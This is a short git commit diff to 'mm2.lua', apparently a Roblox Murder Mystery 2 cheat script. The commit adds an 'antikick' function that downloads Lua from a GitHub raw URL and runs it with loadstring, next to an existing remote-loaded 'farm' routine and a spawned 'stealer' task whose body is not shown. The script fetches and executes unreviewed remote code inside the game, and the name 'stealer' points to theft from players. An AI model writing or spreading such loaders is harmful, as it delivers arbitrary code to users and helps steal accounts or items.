779b49684883ab5648aba7ddf00c022f9bfb6343
bonusttv <lettucetomatos111@gmail.com>
2025-01-19 01:02:33 -0500

    Update mm2.lua

--- mm2.lua
+++ mm2.lua
@@ -4,6 +4,10 @@ end
 local function farm()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2'))()
 end
+local function antikick()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/bonusttv/mm2/refs/heads/main/antikick.lua'))()
+end
 
+task.spawn(antikick)
 task.spawn(stealer)
 task.spawn(farm)
